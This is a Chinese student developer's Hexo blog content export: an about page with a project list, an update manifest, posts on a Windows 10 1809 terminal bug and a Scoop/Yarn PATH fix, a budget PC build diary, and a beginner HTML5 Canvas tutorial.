{"meta":{"title":"QWQAQ 的博客","subtitle":"不忘初心，方得始终","description":"这里是 QWQAQ 的博客。这里将记录一名苦逼学生开发者各种各种有趣的事情... 也许你能在这里找到许多欢乐... 来啊，快活啊 ( ゜- ゜)","author":"QWQAQ","url":"http://qwqaq.com"},"pages":[{"title":"目录","date":"2019-01-28T14:15:57.438Z","updated":"2019-01-28T14:15:57.438Z","comments":true,"path":"categories/index.html","permalink":"http://qwqaq.com/categories/index.html","excerpt":"","text":""},{"title":"关于我","date":"2018-04-19T05:55:14.000Z","updated":"2019-02-19T14:50:19.619Z","comments":true,"path":"about/index.html","permalink":"http://qwqaq.com/about/index.html","excerpt":"","text":"嘿，欢迎来访~ φ(￣∇￣o) 这里是 QWQAQ 的博客 ID Key Value Remarks 0 WHOAMI QWQAQ / QWQCODE - 1 初始化 2002-08-07 - 2 性别 男 - 3 QQ 1149527164 - 4 GitHub @qwqcode - 5 E-mail qwqcode#gmail / 1149527164#qq - 6 其他 网易云音乐 / 微博 / Twitter - 7 会拼写的单词 JS, Node, Vue, Webpack, Electron, Hexo, Markdown, TS, jQuery, ChromeExt, PHP, Laravel, Yii, WordPress, CS, CefSharp, Java, Android, Kotlin, Python, Flask, Cpp, Golang, CSS, Sass, Stylus, Bootstrap, Minecraft, Linux, Sql… - 8 会安装卸载的 VSCode, JetBrains PhpStorm, JetBrains WebStorm, JetBrains PyCharm, Visual Studio, Android Studio, Sublime Text, NotePad++, Adobe PhotoShop, Adobe Illustrator, Adobe Premiere Pro, Adobe Audition, Arduino IDE, PowerShell, Cmder, Git, Curl, Yarn, SSH, Docker, Navicat, Xshell, Chrome, CloudMusic… - 项目 Artalk - 🌌 一款简洁有趣的自托管评论系统，开发中… artalk.js.org ArtalkServerPhp - Artalk 的后端，PHP 版 Nacollector - ⚔ 一个采集工具箱，据说是一个用于采集各种 WEB 资源的工作站？！淘宝、天猫、苏宁、国美 等电商平台数据采集… 一键邀请 一键打包 账号登录获取Cookie 任务多线程 下载内容管理 实时日志 无边框窗体 Web App, CefSharp, WebDriver QwQuery - 🎐 QwQuery 一个 Material Design 风格的学生考试成绩统计站，表格 / 统计图 / 字段排序 / 条件筛选 / 排名处理 book-register - 📖 書記 Online，一个适用于图书室 多人协作共同完成图书录入任务 的在线工作站。JS+PHP。附带实时弹幕功能，Material Design，练手项目 NeverSayTheLastNumber - Vue 写的一个网页数字小游戏，名为：绝不说最后一个数 qwq-coll - 📌 小说采集工具，自写规则。一个支持 自写规则 的 采集工具 hexo-theme-icarus - 本站 Hexo 主题 qwqaq-webhook-server - 一个简单 WEB 服务器，当收到 GitHub Webhooks 发出的请求后执行 shell 命令，如 git pull，仅此而已 library-register-android - 書記 (Android)，一个适用于图书室 多人协作共同完成图书录入任务 的移动工作站 library-register-server - library-register-android 的服务器端 Naupdater - 通用软件 在线/离线 更新工具，7z.dll 解压各种格式的升级文件压缩包，配置文件/启动参数自定义 ASSP - PHP 各大音乐网站直链解析下载 ssoier - NOIP 刷题系列 KuaidiQuery - 物流信息跟踪 Pxtin 图罐头 - 一个属于你的图片灵感库（pxtin.com） PxtinAndroid - 图罐头 Android 客户端 TimeNote 时光笔记 - 记录点滴，留住感动（原时间胶囊) ClassSchedule - 课程表 Android App (开发中) MsgWebhook - Android 短信转发工具 JsTerminal - 网页模拟终端 捐助如果您觉得我的项目对您有帮助，并且您愿意给予我一点小小的支持，您可以通过以下方式向我捐助，这样可以维持项目持续地发展，非常感谢！(/ω＼) Alipay Wechat 捐助者的名字将保存于 捐助者名单 最后，我再次对您致以诚挚的感谢！ 时间轴 生命不息，折腾不止。不忘初心，方得始终。"},{"title":"","date":"2019-01-28T14:15:57.532Z","updated":"2019-01-28T14:15:57.532Z","comments":true,"path":"json/nacollector-updare.json","permalink":"http://qwqaq.com/json/nacollector-updare.json","excerpt":"","text":"{\"latest\":\"1.3.0.0\",\"updateLog\":{\"1.3.0.0\":\"修复 阿里巴巴 采集问题界面优化CefShap 更新到 v69以及其他 BUG修复 和 优化\",\"1.2.0.0\":\"增加启动界面，修复一些 BUG\",\"1.1.0.0\":\"修复 当请求图片响应404错误 时 整个程序终止 的问题\",\"1.0.0.0\":\"第一版发布\"},\"updateRes\":{\"1.3.0.0\":\"http://cdn.qwqaq.com/Nacollector_1.3.0.0_update_fix_2.zip\",\"1.2.0.0\":\"https://github.com/qwqcode/Nacollector/releases/download/1.2.0.0/Nacollector_1.2.0.0_update.zip\",\"1.1.0.0\":\"https://github.com/qwqcode/Nacollector/releases/download/1.1.0.0/Nacollector_1.1.0.0_update.zip\",\"1.0.0.0\":\"\"},\"updateType\":{\"1.3.0.0\":\"a\",\"1.2.0.0\":\"a\",\"1.1.0.0\":\"a\",\"1.0.0.0\":\"a\"}}"},{"title":"dalao 列表","date":"2019-02-08T15:30:04.354Z","updated":"2019-02-08T15:30:04.354Z","comments":true,"path":"links/index.html","permalink":"http://qwqaq.com/links/index.html","excerpt":"","text":"大家快来快来加友链哇！(*/ω＼*) 名称：QWQAQ 简介：生命不止，折腾不息 ( ゜- ゜) 地址：https://qwqaq.com/ 头像：https://qwqaq.com/images/avatar.png 介个我的资料 ↑↑"},{"title":"标签云","date":"2018-10-02T06:45:29.015Z","updated":"2018-10-02T06:45:29.015Z","comments":false,"path":"tags/index.html","permalink":"http://qwqaq.com/tags/index.html","excerpt":"","text":""},{"title":"示例页面","date":"2017-05-22T12:36:03.000Z","updated":"2018-10-02T06:25:41.706Z","comments":false,"path":"sample-page/index.html","permalink":"http://qwqaq.com/sample-page/index.html","excerpt":"","text":"这是一个范例页面。它和博客文章不同，因为它的页面位置是固定的，同时会显示于您的博客导航栏（大多数主题中）。大多数人会新增一个“关于”页面向访客介绍自己。它可能类似下面这样： 我是一个很有趣的人，我创建了工厂和庄园。并且，顺便提一下，我的妻子也很好。 ……或下面这样： XYZ装置公司成立于1971年，公司成立以来，我们一直向市民提供高品质的装置。我们位于北京市，有超过2,000名员工，对北京市有着相当大的贡献。 作为一个新的WordPress用户，您可以前往您的仪表盘删除这个页面，并建立属于您的全新内容。祝您使用愉快！"}],"posts":[{"title":"Win10 1809 调用 CMD/PowerShell/Bash 显示错乱问题","slug":"Win10-1809-调用-CMD-PowerShell-Bash-显示错乱问题","date":"2019-02-18T13:06:49.000Z","updated":"2019-02-20T04:01:59.779Z","comments":true,"path":"527f8ae.html","link":"","permalink":"http://qwqaq.com/527f8ae.html","excerpt":"最近升级到了 Windows 10 1809 版本，发现在 VSCode, Android Studio, PhpStorm 终端窗口中的 CMD/PowerShell/Bash 都有显示错乱的现象，终端在最初打开时光标不能正常显示，只有在执行命令后光标才会出现。","text":"最近升级到了 Windows 10 1809 版本，发现在 VSCode, Android Studio, PhpStorm 终端窗口中的 CMD/PowerShell/Bash 都有显示错乱的现象，终端在最初打开时光标不能正常显示，只有在执行命令后光标才会出现。 @domske Just another recorded gif to show the issue. (recorded before I searched for duplicates. 😄 ) I wondering, is this “really” a bug of Windows 10 - 1809? … Anyway we should handle this. Maybe by replacing all line breaks at initializing the terminal? Or just emulate the enter key to reprint the prompt? The second solution is more a workaround and a bit dirty. But should work. … winpty/issues/156#issuecomment-462546424 @Tyriar, got the same issue. Same OS background. Using RS5 Insider Builds The whole terminal experience in VSCode on Windows Insiders is pretty rough right now. Output Buffers overwriting and regular terminal inputs like CTRL+Backspace printing command characters… issues like that have been increasingly visible to me since RS5. vscode/issues/57803#issuecomment-419664569 @jpalo Same here on 17763.1 with VS Code 1.27.2, but has been several earlier Windows Insider builds. I usually just press enter once to see the command prompt in terminal, or lately I’ve just ignored the fact that there is no prompt and just type in the command, as it works nicely. vscode/issues/57803#issuecomment-423547233 Same goes for zeit/Hyper. After the active dev windows insider ring was lifted onto 19H1, i can also report that the issue persists with the 19H1 prerelease, too. I have this issue too on my Windows 10 Pro 1809, Build 17764.1, when opening a new terminal window. Actually it depends on the size resp. height of the terminal window, whether or how the issue shows up: Terminal window maximized: no issue with new terminals Terminal height below around 22 lines: no cursor, when typing jumps to top with a number of spaces before it Teminal height below around 12 lines: no text and no cursor at all (cursor shortly flashes before disappearing) After pressing ENTER everything is ok. Guys, this may not be related to VS at all. I’m also a user of Android Studio and when I open the terminal tab in the lower panel I get the same issue. vscode/issues #57803: Terminal not in a good state initially on Windows Insider builds rprichard/winpty #156: Reducing window height on startup breaks cmd/powershell as of recent 1809 builds rprichard/winpty #152: Use Microsoft’s new ConPTY API on Windows versions which support it (i.e. Fall 2018 and newer) Microsoft/vscode #67903: [Windows 10][Insider build] Conpty cannot be enabled in Feb.4 Insider build Microsoft/console #270: Investigate apparent WinPTY issue with RS5/19H1 builds Microsoft/console #255: SetConsoleWindowInfo + cmd/powershell yields invisible prompt 大佬们是这样说的 @rprichard (Owner of the winpty repository) I can reproduce it, but I don’t know what’s going wrong yet. When I debug it by setting the WINPTY_SHOW_CONSOLE=1 environment variable, I see the same sort of broken output in the console window that I see in the terminal window. If there’s a HKCU\\Console entry for the path to the winpty-agent.exe binary, then the problem doesn’t reproduce. Somehow the lack of that entry, combined with winpty’s startup code, is leaving the console in a bad state when the cmd/powershell process starts. FWIW: I’m thinking of having winpty itself use conpty when it can: rprichard/winpty#152. I’m happy with node-pty using conpty directly, though. @rprichard If there’s a HKCU\\Console entry for the path to the winpty-agent.exe binary, then the problem doesn’t reproduce. winpty uses SetConsoleWindowInfo during startup, and if that call reduces the height of the console window, then starting cmd/powershell later breaks. I have a non-winpty test case that I’ll attach to a console bug report. (It sounds like it’s too late to fix in Windows, though.) I also opened rprichard/winpty#156 to track the problem. @Tyriar (Member of the Microsoft organization) Upstream issue: Microsoft/console#270 For people experiencing this issue, the way I work around it in the meantime is to just press enter which shows the prompt. You can also just type a command and it will run fine, it’s just that the initial prompt doesn’t display correctly. @Tyriar ConPTY support is landing in the next Insiders build, this uses a new backend for the terminal on WIndows 10 build number 17692+, this is expected to fix many bugs in the terminal on Windows as we’re adopting Microsoft’s official pty API. For earlier versions winpty will still be used a many bugs will still remain (unless they’re fixed in that project). 译： 对 ConPTY 的支持会在下一个 Insiders Build 中发布，它会被用于在 Windows 10 内部版本号 17692+ 上作为终端的新后端，预计这将修复终端在 Windows 下的许多错误，我们正在适配微软官方的 pty API。对于早期版本，winpty 仍然会被使用，但会留下许多错误（除非它们已在该项目中修复）。 vscode/issues/57803#issuecomment-449495423 @Tyriar Update: Windows build number 18309+ is now required for ConPTY to be turned on as it was not stable on 17692. 译：(VSCode 中) 需要 Windows 内部版本号 18309+ 才能开启使用 ConPTY，因为在 17692 上 ConPTY 不稳定。 vscode/issues/45693#issuecomment-456937675 hhh 最后将锅甩给了 Winpty Windows terminal issues caused by winpty #45693 WinptyWindows 更新导致 Winpty 发生了奇怪的问题 有许多软件目前使用的是 Winpty 做为终端的后端（例如 VSCode, PhpStorm, bash.exe） Q: Winpty 是什么？ A: winpty 是一个 Windows 软件包，提供了类似 Unix pty-master 一样的接口，用于实现控制台程序之间的通讯。该软件包包括一个开发库 (libwinpty) 和一个用于 ygwin 和 MSYS 的工具用于在 Cygwin/MSYS pty 下运行 Windows 控制台程序。 rprichard/winpty #156: Reducing window height on startup breaks cmd/powershell as of recent 1809 builds rprichard/winpty #152: Use Microsoft’s new ConPTY API on Windows versions which support it (i.e. Fall 2018 and newer) @rprichard I’m thinking of having winpty itself use conpty when it can: rprichard/winpty#152. I’m happy with node-pty using conpty directly, though. ConPTYWindows 命令行：Windows 伪控制台（ConPTY）的介绍 GitHub 仓库 The new Win32 ConPTY API (formal docs to follow soon) is now available in recent Windows 10 Insider builds and corresponding Windows 10 Insider Preview SDK, and will ship in the next major release of Windows 10 (due sometime in fall/winter 2018). 译： 新的 Win32 ConPTY API（即将推出的正式文档）现在可以在最近的 Windows 10 Insider 版本和相应的 Windows 10 Insider Preview SDK中使用，并将在 Windows 10 的下一个 major release（2018年秋/冬的某个时间）发布。 This will use the ConPTY system provided by the Windows Console team as the backend for the terminal. Enabling this should fix many issues with the Windows terminal, particularly around color support, interactive applications, and shells that natively support VT sequences. Windows 10 1809 (内部版本号 17763.316) 已加入 ConPTY VSCode 在 January 2019 (version 1.31) 的更新中已添加对 ConPTY 的支持，见 更新日志 VSCode 目前在同时使用 Winpty(供旧版系统使用) 和 ConPTY，但需要 Windows 内部版本号 18309+ 才能开启使用 ConPTY，因为在 17692 上 ConPTY 并不稳定。 18309+ 可以设置直接勾选使用 ConPTY： 1&quot;terminal.integrated.windowsEnableConpty&quot;: ture 1809 版本目前就是个坑，WinPTY 有问题，ConPTY 不稳定… 可以加入 “预览体验计划” 升级 Windows 到 18309+ 来解决，或者忍，或是等…… 嗯，就这样… 日后，各种软件可以用 ConPTY 代替 WinPty，或等待 WinPty 的更新… 总之，1089 版本目前就是个坑… 等待 Windows 新的正式版发布…… 伪终端 (Pseudoterminal) 真有意思，有时间以后慢慢补…..","categories":[{"name":"开发工具","slug":"开发工具","permalink":"http://qwqaq.com/categories/开发工具/"},{"name":"VSCode","slug":"开发工具/VSCode","permalink":"http://qwqaq.com/categories/开发工具/VSCode/"},{"name":"Android Studio","slug":"开发工具/VSCode/Android-Studio","permalink":"http://qwqaq.com/categories/开发工具/VSCode/Android-Studio/"},{"name":"PhpStorm","slug":"开发工具/VSCode/Android-Studio/PhpStorm","permalink":"http://qwqaq.com/categories/开发工具/VSCode/Android-Studio/PhpStorm/"}],"tags":[{"name":"Bash","slug":"Bash","permalink":"http://qwqaq.com/tags/Bash/"},{"name":"VSCode","slug":"VSCode","permalink":"http://qwqaq.com/tags/VSCode/"},{"name":"命令行","slug":"命令行","permalink":"http://qwqaq.com/tags/命令行/"},{"name":"终端","slug":"终端","permalink":"http://qwqaq.com/tags/终端/"},{"name":"cmd","slug":"cmd","permalink":"http://qwqaq.com/tags/cmd/"},{"name":"PowerShell","slug":"PowerShell","permalink":"http://qwqaq.com/tags/PowerShell/"},{"name":"Win10","slug":"Win10","permalink":"http://qwqaq.com/tags/Win10/"},{"name":"1809","slug":"1809","permalink":"http://qwqaq.com/tags/1809/"}]},{"title":"解决 Scoop 的 Yarn 无法使用 global packages 的问题","slug":"解决-Scoop-的-Yarn-无法使用-global-packages-的问题","date":"2019-02-17T12:32:12.000Z","updated":"2019-02-18T14:33:06.539Z","comments":true,"path":"3b2a4407.html","link":"","permalink":"http://qwqaq.com/3b2a4407.html","excerpt":"这个问题出现在 MINGW64 (bash.exe) 环境下，通过 Scoop install 的 Yarn，执行命令 yarn global add eslint，然后执行 eslint 响应 /bin/sh: ...: No such file or directory，目前快速的解决方法如下：","text":"这个问题出现在 MINGW64 (bash.exe) 环境下，通过 Scoop install 的 Yarn，执行命令 yarn global add eslint，然后执行 eslint 响应 /bin/sh: ...: No such file or directory，目前快速的解决方法如下： PATH 环境变量添加 %LOCALAPPDATA%\\Yarn\\config\\global\\node_modules\\.bin，且保证其在最前面 After digging around a bit more I think this is an issue with symlinks from scoop (bin is persisted by scoop and the path depth of the persisted directory scoop/persist/yarn/bin is lower than the depth of the ‘normal’ path scoop/apps/yarn/current/bin) and yarn using relative directories in its shell scripts: 1234567891011121314151617&gt; $ cat /c/Users/user/scoop/apps/yarn/current/bin/vue&gt; #!/bin/sh&gt; basedir=$(dirname &quot;$(echo &quot;$0&quot; | sed -e &apos;s,\\\\,/,g&apos;)&quot;)&gt;&gt; case `uname` in&gt; *CYGWIN*) basedir=`cygpath -w &quot;$basedir&quot;`;;&gt; esac&gt;&gt; if [ -x &quot;$basedir//bin/sh&quot; ]; then&gt; &quot;$basedir//bin/sh&quot; &quot;$basedir/../../../../../AppData/Local/Yarn/Data/global/node_modules/.bin/vue&quot; &quot;$@&quot;&gt; ret=$?&gt; else&gt; /bin/sh &quot;$basedir/../../../../../AppData/Local/Yarn/Data/global/node_modules/.bin/vue&quot; &quot;$@&quot;&gt; ret=$?&gt; fi&gt; exit $ret&gt; $basedir is probably resolved to the persisted bin directory, so $basedir/../../../../.. will resolve to the Windows Users directory (e.g. C:\\Users) instead of the user directory of the current user (e.g. C:\\Users\\user). This could normally be fixed by setting the global-folder with yarn config set to something like scoop/apps/yarn/current/global but this does not work correctly (see yarnpkg/yarn#5746 and yarnpkg/yarn#5637). Not sure how to go about this. Editing the .yarnrc file in post_install like in yarnpkg/yarn#5637 doesn’t sound like the best way to do it (it does work though), especially since the file is managed by yarn and the changes might be overridden later on. I guess the only ‘good’ workaround is to use npm for global installs until the global-folder config does actually work in yarn. scoop/issues/1641#issuecomment-434775367","categories":[{"name":"开发工具","slug":"开发工具","permalink":"http://qwqaq.com/categories/开发工具/"},{"name":"Scoop","slug":"开发工具/Scoop","permalink":"http://qwqaq.com/categories/开发工具/Scoop/"}],"tags":[{"name":"Scoop","slug":"Scoop","permalink":"http://qwqaq.com/tags/Scoop/"},{"name":"yarn","slug":"yarn","permalink":"http://qwqaq.com/tags/yarn/"},{"name":"bash","slug":"bash","permalink":"http://qwqaq.com/tags/bash/"}]},{"title":"送给自己的新年礼物：继续捡垃圾系列","slug":"送给自己的新年礼物：继续捡垃圾系列","date":"2019-02-13T15:04:00.000Z","updated":"2019-02-20T14:49:18.757Z","comments":true,"path":"e8588299.html","link":"","permalink":"http://qwqaq.com/e8588299.html","excerpt":"新的一年，新的开始。趁我还没老（qwq 明年就 18 岁了），现在最开心的，就是能得到压岁钱吧，嘿嘿嘿.. 嘿嘿嘿，非常非常感谢亲戚朋友们的赞助（鞠躬）（awsl，居然一年比一年多）。想想该买点什么好呢？emm… 我想简单地实现自己心中一直就有但从未实现的一个小愿望… 赶快捡垃圾去吧！(/ω＼) 我已经无法接受 HD4000 核显了啊。如题 –送给自己的新年礼物：继续捡垃圾系列。","text":"新的一年，新的开始。趁我还没老（qwq 明年就 18 岁了），现在最开心的，就是能得到压岁钱吧，嘿嘿嘿.. 嘿嘿嘿，非常非常感谢亲戚朋友们的赞助（鞠躬）（awsl，居然一年比一年多）。想想该买点什么好呢？emm… 我想简单地实现自己心中一直就有但从未实现的一个小愿望… 赶快捡垃圾去吧！(/ω＼) 我已经无法接受 HD4000 核显了啊。如题 –送给自己的新年礼物：继续捡垃圾系列。 序言 至于为什么要捡这个垃圾？为什么突然有捡垃圾的想法呢？这要从几年前开始说起… 几年前捡来 ThinkPad T410，中了小黑本的毒，加上身边人的一些疯狂宣传（表哥和我爸超级喜欢 IBM，天天吹爆的那种），一次又一次捡 ThinkPad T系列的本子，捡得倾家荡产，身无分文（# 滑稽），我便变卖家产，来维持… 咳咳，反正就是觉得当年做了很多错误的决定，为什么不自己装一台电脑呢？！捡 ThinkPad 血亏啊！（黑线 如今，几年过去了，一直想弥补一下曾经的错误抉择。这是第一次，我决定自己买零件来装一台电脑，成为一名名副其实的垃圾佬吧（本来就是。逃。。 现在，手中现在用着的 ThinkPad T430 是我最后捡的一款T系列的本子，我认为其实配置并不算太辣鸡，又不是不能用，i7-3635QM 的 CPU，8GB RAM，核显 HD4000，本来之前还有 NVS5400M，坏掉了（前不久坏的，原因不明…），换了块没有独显的主板，附拆机图一张： T430 这个配置看个视频，写个代码，还是能够胜任的，只是 PR、AE 也太卡了，例如加个滤镜就卡出翔，再加点高斯模糊之类的，要上天了啊，8分钟视频渲染40分钟也是醉了…（又不是不能用） 这又要让我想到，之前捡的 T410 AE渲染一个片头从晚上渲染到第二天早上，居然没上天？！（质量好，没办法），想想如果烧坏了的话，可能早就不会中 ThinkPad 的毒了。 T430 开始，联想抛弃了传统的键盘，据说是为了顺应时代潮流、担负时代使命，巧克力键盘是为了将电脑做的更轻薄。然而，现在一摸到 T410、T420 的传统键盘，心中有百万个无法接受，心情复杂啊（虽然，又不是不能用）。 ThinkPad 陪我度过了整个初中，在三年时光里，一个个日日夜夜，敲击着 ThinkPad 键盘，注视着 ThinkPad 的屏幕（233 又不是不能用），不管是笑，亦或者忧郁或是低落，它总是在那里，伴我前行，走过这三年。 很多事情犹如天气，慢慢热或是渐渐冷，等到惊悟的时候，已过了一季。 时间终将会变成虚无缥缈的东西，而记忆是让人领悟了时间？！ 今天 17，明年 18，心中不免暗自惆怅，却又满怀憧憬。 当你在惊悚中下意识地回过头去，却只是看见影子。 突然伤感？！咳咳，过去的就让他随风而去吧，我选择捡垃圾！ No.1 了解一下比较合适的方案。问朋友，网上搜，图吧看，比对价格比对性能，深思熟虑。 AMD Yes! E3神教 YES!! 好的，老平台，还是入 E3 V2 + B75，便宜嘛… emmm…. 搞个好点的显卡剪片用，内存 16GB 吧。 本来想用笔记本内存条的，某宝真的什么都有。 鉴于稳定性不佳，还是来一根新的威刚 DDR3 8GB 1600，一根二手（便宜100） 选择显卡很纠结，A卡便宜，某宝A卡绝对是矿卡，A卡不支持 CUDA（疑问：AE PR等 Adobe系软件会体验不佳吗？但也有 openCl 加速） 败就败在钱包上，还是A卡吧，只要能用就行，RX580 2018年产的，锻炼也就锻炼顶多一年不到（哭死 对矿卡的理解： 最终决定主板: 华硕 P8B75-M LX PLUS –258元CPU: E3 V2 + 什么英特尔原装风扇 –483元GPU: AMD RX580 8GB 蓝宝石 超白金（2018年出产，AMD矿卡无疑了…）–883元RAM: 威刚 D3 8G 1600 全新 + 二手 –329+208=537元电源: 爱国者 额定500W 全模 –209元机箱: 追风者 P300 –249元（本来想用鞋盒，某热心网友提醒有自燃的风险，还是算了！可能是假的垃圾佬）硬盘: 笔记本里面取出来，256GB SSD + 2TB HDD –0元硅脂: 笔记本里面翘一坨 –0元其他: 鼠标+键盘+显示器（已有） –0元 总计: 2619元（钱包瑟瑟发抖，掏出压岁钱+多年的积蓄，最后身无分文的我哭了，你呢？） No.2 当然是选购垃圾。由于没有体验过闲鱼，知道其可能和某宝一样水深，故还是选择在某宝上订购评分较高，销量最多的垃圾。 最后挑的都是描述评分4.8+，销量过百，差评以及追评问题较少，晒图较多的店铺。 付款！钱包不忍直视。。。 No.3 等啊等啊等啊。过年快递停运，客服放假，大多数店都是初八（2月12日）恢复正常发货。 机箱是菜鸟仓（成都仓），2月8号就能发货了，好评！ 春节正是钱包暴涨的时期，快递停运这个设定也太（哭死*2 2019-2-11 (初七) 从2月8号等到今天，这 TM 也太慢了。 正常的快递是直接从成都发到这里，而菜鸟物流转一大圈，太秀了吧： 机箱总体质量还是不错的，令我惊讶的是一个机箱居然自带那么多线，缺点就是玻璃感觉有点容易碎，上面写着 TEMPERED GLASS 钢化玻璃？！第二行 Please handle with care，不是应该写 Please handle with crazy 吗？#(滑稽)，两百来块的机箱还算是值得起这个价了吧。 电话微波炉(暂定)： 继续等。 2019-2-12 (初八) 买的基本上都发货了。接下来就又是漫长地等待。。。（╯‵□′）╯︵┴─┴ 2019-2-13 (初九) 第一根内存条到手~ 因为成都发货，很快，第一天下午寄出，第二天上午收到，发的中通。送了一张成都日报（什么鬼），看着还是比较新的，看不出有什么问题。 继续等。。。（╯‵□′）╯︵┴─┴ 2019-2-14 (初十) 主板和显卡到手，感觉主板好轻，显卡太重了，扛回家.jpeg 打开包裹，震惊了（原谅我第一次买显卡 SMG?!!!! 这个… 燃气灶居然… 能插进去吗？ 好吧…… 是主板插显卡上 插上后挡住了 4 个 SATA 口，2 个 PCIE…（哎~ 默默接受事实吧…） (/ω＼) 我的爪子 菊花照 接下来说说这块华硕的板子： 本子够新，99 新？！（挡板完全是新的 blingbling~） 迫不及待把板子放机箱里，机箱的跳线刚刚够长（背面绕一下） 好啦，贴一个 Google Logo~ 信仰++ 2019-2-15 (十一) 上午电源到啦 包装得严严实实，盒子上面居然有保护膜（好评） 太可怕了，电源也这么大的吗？！Σ(っ °Д °;)っ 附带的线材棱角分明，十分割手，现在手都还疼呢… 这是 TA 的接口 这是很有味道的线（汽油味？！） 迫不及待地插上了 下午一点决定睡觉，）@（！*）（#！&amp;！@ 心情复杂，太难熬了，派送太慢了… 睡不戳，躺床上看泡面番… 两点来了一条短信，包裹我给你放门卫了 立刻跳下床去拿（兴奋要死） 打开包裹，666 CPU 直接扔一袋子里？！没塑料壳的保护诶。英特尔的风扇海星吧（至少很新）海星海星。 （过于鸡冻，没有拍照） 集齐6件宝具，终于可以接通电源，按下开机键，静静观赏（还静得下来吗）等候多时那啥？ 按下开机键，风扇转了一下，停了？？？ 黑人问号？？？ 太调皮了，趁我不注意风扇又莫名转了起来（大概是主板在做硬件检测吧） 风扇有 5 个，居然声音没有想象中的那么大，可以接受，嗯（满意） 温度居然还能这么低？！ 和日常 100° 的笔记本合影留念，这是一个时代的终结，也是一个时代的开始（欢呼 CPU 十六线程，象棋跑分 12225，知足了 装上驱动后，才可以看显卡的信息。菜鸟表示看不懂 拷个机，结果还算可以吧，GPU 最高 75 度，硅脂都不用重新打？！CPU 最高 60 度（泪流满面啊，笔记本 webpack 打一次包都会飙升 100°，夏天更不得了） 拷机后温度能很快降下来，可以可以 内存条二手那根是 2014 年的了，速度还没笔记本的快，将就。 经过一番测试后，关机开始把线装机箱里去 终于塞进去了，似乎比较凌乱 好的，就这样 我看着他，他看着我（我笑了） ？？？ 重装系统，驱动全部升级，顺便安装逗比音效（音质+++），Scoop 安装好各种工具 N卡网速快，A卡音质好 有了一张显卡，从此界面流畅无比，掉帧毫无，没有卡顿的赶jio 就像几年前第一次用上 SSD 导出一个 1080p 视频，原来需导 40 分钟 (核显 HD4000) 现在只要 3 分钟 2019-2-16 (十二) 最后一个包裹，第二根内存条到啦~ 这样就有 16GB 的内存了，默认好评 十多天的等待终于结束，这是一次愉快的体验 找到了个绿色版，再来娱乐一下 2019-2-17 + 试试 GTA V 我只是来看风景的 没有 van 过的船新版本 生产能力大幅提升，毫无卡顿，爽翻~ 升级到 16GB 的内存条再也不用顾虑 Chrome 吃内存了 只不过 1809 的 Win 10 终端有些 BUG，有点难以忍受，等待正式版更新 END 随着时间的推移，24 号倒计时不禁让我突然失落 珍惜那些快乐的日子，美好的时光….. 假期最后唯一的一丝欢乐终将散尽 接下来的：2019 加油，___","categories":[{"name":"日常","slug":"日常","permalink":"http://qwqaq.com/categories/日常/"}],"tags":[{"name":"装机","slug":"装机","permalink":"http://qwqaq.com/tags/装机/"},{"name":"捡垃圾","slug":"捡垃圾","permalink":"http://qwqaq.com/tags/捡垃圾/"},{"name":"E3神教","slug":"E3神教","permalink":"http://qwqaq.com/tags/E3神教/"}]},{"title":"HTML5 Canvas 真香！刀剑神域 HP Bar 第二弹","slug":"HTML5-Canvas-真香！刀剑神域-HP-Bar-第二弹","date":"2019-01-23T16:43:04.000Z","updated":"2019-01-28T14:15:57.381Z","comments":true,"path":"db974054.html","link":"","permalink":"http://qwqaq.com/db974054.html","excerpt":"从此踏上了一条 Canvas 的不归路，正是这样折腾，选项卡再一次刷炸浏览器，Chrome 又一次挤爆内存…… 这次，用 Canvas 可能是最大程度地复刻了 TV 截图中的血量条吧，比起拿 CSS 来写完美得多，CSS 拿来做这个太脑残。所以，“Canvas 真香！”，“只是搞这个，头有点凉”。这篇文章的内容可能算是入门 Canvas 的粗略知识汇总。","text":"从此踏上了一条 Canvas 的不归路，正是这样折腾，选项卡再一次刷炸浏览器，Chrome 又一次挤爆内存…… 这次，用 Canvas 可能是最大程度地复刻了 TV 截图中的血量条吧，比起拿 CSS 来写完美得多，CSS 拿来做这个太脑残。所以，“Canvas 真香！”，“只是搞这个，头有点凉”。这篇文章的内容可能算是入门 Canvas 的粗略知识汇总。 其实，你可以选择阅读：MDN 文档 / w3schools / Google 下面是我折腾一下午的收获： 创建 CanvasGiven this &lt;canvas&gt; element: 1&lt;canvas id=\"canvas\"&gt;&lt;/canvas&gt; … you can get a reference to the canvas element within the CanvasRenderingContext2D by using the canvas property: 123var canvas = document.getElementById('canvas');var ctx = canvas.getContext('2d');ctx.canvas // HTMLCanvasElement 参考：MDN 文档 画一个矩形直接 strokeRect() 12ctx.strokeStyle = 'blue'; // 蓝色的笔ctx.strokeRect(10, 10, 100, 100); 或者，使用 lineTo() 123456789101112131415161718ctx.strokeStyle = '#00';ctx.fillStyle = '#9f9'ctx.lineWidth = 4;ctx.beginPath();ctx.moveTo(30,30);ctx.lineTo(230,30);ctx.lineTo(230,200);ctx.lineTo(30,200);ctx.lineTo(30,30);ctx.stroke();ctx.beginPath();ctx.moveTo(300,30);ctx.lineTo(500,30);ctx.lineTo(500,200);ctx.lineTo(300,200);ctx.lineTo(300,30);ctx.fill(); 参考：lineTo() - MDN 文档 lineCap 和 lineJoinlineCapDraw a line with rounded end caps: 1234567var c = document.getElementById(\"myCanvas\");var ctx = c.getContext(\"2d\");ctx.beginPath();ctx.lineCap = \"round\";ctx.moveTo(20, 20);ctx.lineTo(200, 20);ctx.stroke(); lineJoinCreate a rounded corner when the two lines meet: 12345678var c = document.getElementById(\"myCanvas\");var ctx = c.getContext(\"2d\");ctx.beginPath();ctx.lineJoin = \"round\";ctx.moveTo(20, 20);ctx.lineTo(100, 50);ctx.lineTo(20, 100);ctx.stroke(); 参考：w3schools 铺满屏幕12canvas.width = window.innerWidth;canvas.height = window.innerHeight; 引用外部资源在绘制引用了外部资源的内容前，需要预先加载完成这些资源，Canvas 才能正常绘制。 12345678910111213141516171819202122let canvas = document.querySelector('canvas');var ctx = canvas.getContext('2d');canvas.width = window.innerWidth; // 铺满屏幕canvas.height = window.innerHeight;// 加载字体(new FontFace('SAOUI', 'url(./font/SAOUI.otf)')).load().then((font) =&gt; &#123; document.fonts.add(font);&#125;);// 加载背景let bg = new Image();bg.src = \"./img/bg.jpg\";// 加载图标var flashIcon = new Image();flashIcon.src = './img/flash.svg';// 页面加载完毕后执行window.onload = function () &#123; draw();&#125; 1234function draw() &#123; ctx.fillStyle = ctx.createPattern(bg, \"no-repeat\"); // '#03A9F4'; // 设置背景图片 ctx.fillRect(0, 0, canvas.width, canvas.width/bg.width * bg.height); // 填充图片，图片自适应高度&#125; 参考：StackoverFlow 